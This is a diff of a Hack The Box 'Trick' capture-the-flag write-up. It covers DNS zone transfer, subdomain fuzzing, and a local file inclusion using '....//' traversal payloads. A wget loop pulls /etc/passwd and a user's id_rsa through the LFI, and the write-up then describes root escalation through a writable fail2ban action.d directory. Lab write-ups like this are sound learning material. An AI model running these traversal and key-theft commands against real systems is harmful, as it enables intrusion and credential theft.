@@ -1,6 +1,27 @@
 IP: 10.10.11.166
 
-## Nmap
+Tester: LifeTimeScriptKiddie
+Target: trick.htb - 10.10.11.166
+Used tools: nmap, gobuster, ffuf, wfuzz, dig, nslookup, host, dnsrecon
+
+Vulnerability: 
+DNS set up misconfiguration revealed two pre-production webpages.
+One pre-production web page has directory traversal vulnerability. 
+The tester used directory travesal vulnerability in one web page, and gained user credentials (Username and ssh). Using a misconfiguration of the installed third party application, the tester gained system root access. 
+
+Recommendation: 
+The most significant vulneability is the misconfiguration of DNS. The tester highly recommends restricting DNS zone transfer. 
+
+Key take away from the box 
+1. Zone Transfer (dig, etc.)
+2. Tool options - (wfuzz vs fuzz)
+3. A quick bash scripting. 
+4. 
+
+
+# 1. Technical details
+
+## Port scanning with nmap. 
 ```
 
 PORT   STATE SERVICE VERSION
@@ -19,36 +40,34 @@ PORT   STATE SERVICE VERSION
 ```
 
 ## Attack vector planning
-I decided to check in order 22, 25, 53, and 80.
-22 Usually requires SSH credentials. Brute forcing usually doesn't work well. 
+The tester decided to check in order 22, 25, 53, and 80.
 
-	22 : SSH - Need Credential
-	25 : SMTP  - Not my priority.  
-		Checked with using nmap --script smtp* 10.10.11.166
-				No luck
-	53 : DNS
-		dig <webpage>
-		dig axfr <website.com> @<name-server>
-		dig axfr <website> @<IP>
-		dig +short ns <url>
-		fierce -nds <domain>
-		host -l <test-url> <name-server>
-		nslookup 
-			server <name-server>
-			set type=any
-			ls -d <test-url>
-		dnsrecon -d <website> -t axfr
-		whois <ip>
-		dnscan -d <domain> -w <subdomain.txt>
-		https://github.com/rbsec/dnscan
 
+		22 : SSH - Need Credential. 22 Usually requires SSH credentials. Brute forcing usually doesn't work well. 
+		25 : SMTP  - Checked with using nmap --script smtp* 10.10.11.166
+				No significant indication for me to jump in. 
+		53 : DNS 
+			dig <webpage>
+			dig axfr <website.com> @<name-server>
+			dig axfr <website> @<IP>
+			dig +short ns <url>
+			fierce -nds <domain>
+			host -l <test-url> <name-server>
+			nslookup 
+				server <name-server>
+				set type=any
+				ls -d <test-url>
+			dnsrecon -d <website> -t axfr
+			whois <ip>
+			dnscan -d <domain> -w <subdomain.txt>
+			https://github.com/rbsec/dnscan
 	
-	80 : HTTP
+		80 : HTTP
 
 
 ### Port 53 - DNS Enumeration
 ``` 
-with dig Command 
+with dig Command, the hidden website - preprod-payroll.trick.htb
 	dig axfr <website> @<IP>
 ; <<>> DiG 9.18.0-2-Debian <<>> axfr trick.htb @10.10.11.166
 ;; global options: +cmd
@@ -83,7 +102,7 @@ dnsrecon -d trick.htb -t axfr
 ```
 
 dig returns preprod-payroll.trick.htb. 
-preprod might indicates the webpage is a preproduction website, which should not be facing external network. 
+Preprod might indicates the webpage is a preproduction website.
 For now, I will keep this on the side and move on to port 80. 
 
 ### Port 80 - HTTP
@@ -126,18 +145,13 @@ To activate this form, sign up at
 [https://startbootstrap.com/solution/contact-forms](https://startbootstrap.com/solution/contact-forms)
 ```
 
-***Don't launch an attack against that website. 
+Recommendation: **Don't launch an attack against that website - https://startbootstrap.com/solution/contact-forms**. 
 
 
 
 
-Signup :
-![[Pasted image 20221022215820.png]]
+I was not able to making progress on that website. 
 
-https://packetstormsecurity.com/files/165572/SB-Admin-Cross-Site-Request-Forgery-SQL-Injection.html
-
-
-No moving forward. 
 Time to fuzz. The page didn't like gobuster, so used ffuf. 
 ```
 gobuster dir -url http://trick.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
@@ -146,7 +160,7 @@ Error: the server returns a status code that matches the provided options for no
 
 ```
 
-ffuf returns some directories but not usuable. 
+ffuf returns some directories but not usuable. CSS and JS are common language for frontend websites. 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://10.10.11.166/FUZZ| tee fuff
 
@@ -157,68 +171,83 @@ assets                  [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 2
 
 ```
 
-### preprod 
+## Port 80 - Fuzzing with wfuzz, ffuf. 
 
-Decided to dig more preprod-payroll.trick.htb.
-Fuzzed **preprod-FUZZ.trick.htb**
+Decided to dig more preprod-payroll.trick.htb address. 
 
-For whatever reason, the below syntax didn't work. 
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://preprod-FUZZ.trick.htb| tee fuff.preprod-FUZZ
+Fuzzed **preprod-FUZZ.trick.htb** using ffuf and wfuzz. 
 
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://trick.htb -H "HOST :preprod-FUZZ.trick.htb" -fs 5480
+For whatever reason, the ffuf didn't show much result other than preprod-payroll, which is already known. 
+
+```
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://preprod-FUZZ.trick.htb| tee fuff.preprod-FUZZ`
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt 
+-u http://trick.htb -H "HOST :preprod-FUZZ.trick.htb" -fs 5480
+
 -H is the header "name: Value" Once specifiy the header value, the tool worked. Don't know why. 
+```
 
 
 
 
-After updating /etc/hosts file, the preprod-marketing.trick.htb poped up. 
+
+Instead of trying harder. Decided to trying smarter with fuzzer.
+
+```
+
+Wfuzzer 
+$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: preprod-FUZZ.trick.htb" -u 10.10.11.166 -t 100 --hl 83 
+
+payroll
+marketing
+```
+
+
+
+
+Three subpages were identified. With this format, the first thing I usually try is directory traversal. The manual ../../../../etc/passwd didn't work. So wfuzz was used to do search for local file inclusion. 
+```
 http://preprod-marketing.trick.htb/index.php?page=services.html
 http://preprod-marketing.trick.htb/index.php?page=about.html
 http://preprod-marketing.trick.htb/index.php?page=contact.html
 
-Time to do directory traversal. 
+
 ```
-http://preprod-marketing.trick.htb/index.php?page=..//..//..//..//..//etc/passwd
-Didn't work. Instead of trying harder. Decided to trying smarter with fuzzer. 
 
 
+/etc/passwd was located with wfuzz. From the /etc/passwd, a valid username, michael, was received. 
 
+ Used bash scripting to download sensitve and common files, such as /etc/passwd, id_rsa, etc. 
+
+
+```
 └─$ wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//FUZZ --hw 0 >> LFI.Marketing.linux_all
 
+─$ cat LFI.Marketing.linux_all|grep /etc/passwd
+000000398:   200        42 L     69 W       2397 Ch     "/etc/passwd-"  
 
-└─$ cat LFI.Marketing.linux_all|awk -F '"' '{print $2}' >> files.txt
+
+└─$  cat LFI.Marketing.linux_all|awk -F '"' '{print $2}' >> files.txt
 └─$  cat LFI.Marketing.linux_all|awk -F '"' '{print $2}' |grep -i root >> sensitive_files.txt
 └─$  cat LFI.Marketing.linux_all|awk -F '"' '{print $2}' |grep -i home >> sensitive_files.txt
 
+From vim:
 :%s!\~/!/home/michael/!                                                                                                                                 
 
 
 
-└─$ cat existing_files.txt |awk -F "//" '{print $5}'  
-
-
-Weird command...output
 $ while read -r line; do wget http://preprod-marketing.trick.htb/index.php?page=....//....//....//..../"$line"  ; done <  ../sensitive_files.txt
 
-update the senstive_files.txt :%s!///!//!                                                                                                                                            
-....//....//....//....//home/michael/anaconda-ks.cfg
 
-
-
-
-'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fssh%2Fssh_config'                                                                                          
-'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fssh%2Fsshd_config'
-
-
-
-From vim
-
-	:%s!^!//!
-	:%s!root!home/michael!                                                                                                                                 
 
 ```
 
-Got the michael's id_rsa
+
+
+
+## System Access via ssh and  PE via third party application. 
+One of the output from the bash scripting was michael's id_rsa. 
 ```
 0408  4 -rw-r--r-- 1 kali kali  1823 Oct 30 19:45 'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fmichael%2F.ssh%2Fid_rsa'
 4860433  4 -rw-r--r-- 1 kali kali  1823 Oct 30 19:48 'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fmichael%2F.ssh%2Fid_rsa.1'
@@ -228,7 +257,9 @@ Got the michael's id_rsa
 
 ```
 
-Change the weird file name to id_rsa, and change the file permision to 600. Gained system access. 
+The tester was able to gain system access as non-root user after the file permission was 
+changed to 600. 
+
 ```
 └─$ ssh michael@10.10.11.166 -i id_rsa
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -248,136 +279,38 @@ michael@10.10.11.166's password:
 
 Once logged in, I followed the usual Linux PE from my previous note. 
 https://app.gitbook.com/s/-MdC6F2qPks25QX5I3wr/oscp_prep/3.-linux-pe
-So generally, I check for services, weak file permission, sudo, cronjobs, suid/sgid, other files, then kernel exploit.  With sudo -l command, the user michael has authority to restart fail2ban service. 
+So generally, I start with the user, group, privileges, etc. Then, I check for services, weak file permission, sudo, cronjobs, suid/sgid, other files,  kernel versions, then network connections.  In this case, sudo -l revealed that the user michael has authority to restart fail2ban service. 
 
 
 ```
-michael@trick:~$ sudo -l
+michael@trick:~$ sudo -lgroup
 
     (root) NOPASSWD: /etc/init.d/fail2ban restart
 
-```
-
-https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49
 
 
-
-
-
-
-=================================================================
-For whatever reason, ffuf didn't give me any result. 
-
-
-ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://trick.htb/ -H "Host: preprod-marketing.trick.htb/index.php?page=FUZZ" -mc 200 
+michael@trick:~$ groups
+michael security
 
 ```
 
-....//....//....// 
-This website probably has some sort of filtering to block ../../../ but ....//....//....// works!
+The user was in security group and the fail2ban configuration folder, action.d, is a part of the security group. 
 
+https://research.securitum.com/fail2ban-remote-code-execution/
 
-```
-
-
-
-
-
-
-
-
-
-
-
-========================================================
-
-
-
-
-
-
-
-![[Pasted image 20221024090825.png]]
-
-![[Pasted image 20221024090853.png]]
-
-
-
-![[Pasted image 20221024093742.png]]
-
-
-Reason why I need to get annual subscription
+According to the above website, it seems like I need to find a file that will be triggered on update actionban variable. Then, trigger it by enforcing banned behavior. 
 
 ```
-dig axfr @10.10.11.166 trick.htb
-
-; <<>> DiG 9.18.0-2-Debian <<>> axfr @10.10.11.166 trick.htb
-; (1 server found)
-;; global options: +cmd
-trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
-trick.htb.		604800	IN	NS	trick.htb.
-trick.htb.		604800	IN	A	127.0.0.1
-trick.htb.		604800	IN	AAAA	::1
-preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
-trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
-;; Query time: 23 msec
-;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
-;; WHEN: Tue Oct 25 11:49:26 EDT 2022
-;; XFR size: 6 records (messages 1, bytes 231)
-
-
-```
-trick.htb --> dig --> preprod-payroll.trick.htb -->
-
-preprod-payroll.trick.htb 
-
-FUZZ-payroll.trick.htb
-preprod-FUZZ.trick.htb
-preprod-FUZZ.trick.htb/FUZZ.php
-
-
-## Syntax issue
-Wrong
-```
- ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://preprod-FUZZ.trick.htb/ -mc all -fc 404                                               
- ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://preprod-FUZZ.trick.htb -mc all -fc 404                               
- ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://preprod-FUZZ.trick.htb -mc all -fc 404 -s                            
-  ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://preprod-FUZZ.trick.htb -mc all -fc 404 -s                                                                                                       
- 1426  ls                                                                                                           
- 1427  ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://preprod-FUZZ.trick.htb
- -mc all -fc 404 -s
-
+michael@trick:/etc/fail2ban$ ls -lisa
+total 76
+264287  4 drwxr-xr-x   6 root root      4096 Oct 31 13:54 .
+130561 12 drwxr-xr-x 126 root root     12288 Oct 31 13:44 ..
+269281  4 drwxrwx---   2 root security  4096 Oct 31 13:54 action.d
 
 ```
 
 
-Right
-```bash
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -u http://trick.htb/ -H Host:preprod-FUZZ.trick.htb/ -mc all -fs 5480 -fc 400 
+Since the user michael don't have write privilige on that folder, I copy the file to the my working folder and modfiy the variable and copy back to the /etc/fail2ban/action.d location.
+Then trigger the updated variable by forcing wrong ssh login attempts. 
 
-marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 25ms][0m
-
-payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 27ms][0m
-
-```
-
-![[Pasted image 20221026105908.png]]
-
-
-![[Pasted image 20221026111120.png]]
-
-Required a heavy troubleshooting. For whatever reason, i was not able to connect to marketing website, even though my fuzzer worked. 
-Suspecting It was route issue. 
-
-![[Pasted image 20221026123653.png]]
-
-https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/
-
-https://github.com/Dr-Noob/HTB/blob/master/writeups/trick.md
-
-https://zenn.dev/shooq/articles/5155c5d599025b
-
-https://jarrodrizor.com/trick-write-up/
-
-https://github.com/Dr-Noob/HTB/blob/master/writeups/trick.md
 
